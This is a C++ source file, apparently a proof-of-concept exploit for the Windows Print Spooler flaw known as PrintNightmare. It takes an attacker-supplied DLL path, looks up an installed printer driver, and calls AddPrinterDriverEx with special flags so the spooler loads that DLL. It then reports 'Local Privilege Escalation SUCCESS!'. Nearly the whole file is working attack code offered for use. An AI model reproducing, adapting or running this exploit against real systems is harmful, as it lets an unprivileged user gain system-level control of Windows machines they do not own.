#include <iostream>
#include "resource.h"
//#include "stdafx.h"
#include "my_rpc.h"
#include <xpsprint.h>
#include <fstream>
#define RPC_USE_NATIVE_WCHAR
#include <stdio.h>
#include <tchar.h>
#include  <io.h>
#include <time.h>
#include <Windows.h>
#include <memory>
#include <string.h>
#pragma comment(lib, "rpcrt4.lib")
using namespace std;

/*
	reference:
		http://noahblog.360.cn/untitled-3/
		https://github.com/afwu/PrintNightmare
*/

// coded by @evilash

int wmain(int argc, wchar_t* argv[])
{
	//[DLL Path]
	WCHAR src_exp_path[0x200] = { 0 };
	wsprintf(src_exp_path, L"%s", argv[1]);


	//[define DRIVER_INFO_* structures]
	DRIVER_INFO_2 info;
	info.cVersion = 3;
	info.pConfigFile = src_exp_path;
	info.pDataFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
	//If target is 2008
	//info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_neutral_4616c3de1949be6d\\Amd64\\UNIDRV.DLL";
	info.pDriverPath = NULL;
	info.pEnvironment = NULL;
	info.pName = (LPWSTR)L"123";

	//[define for Enum..]
	LPBYTE pinfo = NULL;
	DWORD pcbNeeded;
	DWORD numDriversExist;

	printf("[+] Start Found pDriverPath...\n");

	//[enumerates installed drivers]
	EnumPrinterDriversW(NULL,
		NULL,
		2,
		NULL,
		0,
		&pcbNeeded,
		&numDriversExist
	);
	printf("[+] numDriversExist: %d\n", numDriversExist);

	try {
		pinfo = (LPBYTE)malloc(pcbNeeded);
	}
	catch (char* e) {
		pinfo = NULL;
		printf("[-] Exception raised: %s\n", e);
	}

	//[Start find Printer Driver]
	BOOL ok = EnumPrinterDriversW(NULL,
		NULL,
		2,
		pinfo,
		pcbNeeded,
		&pcbNeeded,
		&numDriversExist
	);

	if (ok != 1)
	{
		printf("[-] find Printer Driver ERR: %d\n", ok);
	}

	printf("[+] find Printer Driver ok\n");

	DRIVER_INFO_6W* foundInfo = (DRIVER_INFO_6W*)pinfo;

	wprintf(L"[+] Found DriverPath :%s\n\n", foundInfo->pDriverPath);
	wprintf(L"[+] Found DefaultDataType :%s\n\n", foundInfo->pDefaultDataType);
	wprintf(L"[+] Found szHardwareID :%s\n\n", foundInfo->pszHardwareID);


	info.pDriverPath = foundInfo->pDriverPath;

	printf("[+] Start Load DLL to Driver Path\n");
	DWORD hr = AddPrinterDriverEx(NULL,
		2,
		(PBYTE)&info,
		APD_COPY_ALL_FILES | 0x10 | 0x8000
	);
	printf("[+] AddPrinterDriverEx %d\n",hr);
	
	if (hr == 1)
	{
		printf("[+] Local Privilege Escalation SUCCESS!\n");
	}
	else {
		printf("[-] AddPrinterDriverEx \n", hr);
	}
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}